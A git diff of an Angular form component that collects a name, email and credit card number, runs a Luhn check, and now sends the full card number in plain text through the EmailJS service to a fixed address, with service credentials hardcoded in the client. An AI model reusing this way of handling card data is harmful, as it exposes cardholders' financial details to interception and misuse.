@@ -2,6 +2,7 @@ import { Component } from '@angular/core';
 import { RouterOutlet } from '@angular/router';
 import { FormsModule } from '@angular/forms'; 
 import { CommonModule } from '@angular/common';
+import emailjs from '@emailjs/browser'
 
 @Component({
   selector: 'app-root',
@@ -19,7 +20,7 @@ export class AppComponent {
   };
 
   submitted=false;
-
+  
   onSubmit(form: any) {
     if (!form.valid) {
       alert('Please complete all fields correctly before submitting.');
@@ -30,17 +31,37 @@ export class AppComponent {
       alert('Credit card number is invalid. Please try again.');
       return;
     }
-  
-    const emailBody = `Name: ${this.user.name}\nEmail: ${this.user.email}\nCard: ${this.user.card}`;
-    window.location.href = `mailto:test@dn-uk.com?subject=Form Submission&body=${encodeURIComponent(emailBody)}`;
-  
-    this.submitted = true;
-  
-    // Optional: Clear form after sending
-    setTimeout(() => {
-      this.submitted = false;
-      form.resetForm();
-    }, 3000);
+
+    this.sendEmail(form);
+  }
+
+  sendEmail(form: any) {
+    const templateParams = {
+      to_email: 'test@dn-uk.com',
+      user_name: this.user.name,
+      user_email: this.user.email,
+      user_card: this.user.card
+    };
+
+    emailjs
+    .send('service_7s8ljg5', 'template_5o1piap', templateParams, '0FWJS1rBZprMLg9cl')
+    .then(
+      (response) => {
+        console.log('SUCCESS!', response.status, response.text);
+        alert('✅ Email sent successfully!');
+        this.submitted = true;
+
+        // Optional: Clear form after success
+        setTimeout(() => {
+          this.submitted = false;
+          form.resetForm();
+        }, 3000);
+      },
+      (err) => {
+        console.error('FAILED...', err);
+        alert('❌ Failed to send email.');
+      }
+    );
   }
 
   validateLUHN(card: string): boolean {
@@ -57,4 +78,5 @@ export class AppComponent {
     }
     return sum % 10 === 0;
   }
+  
 }
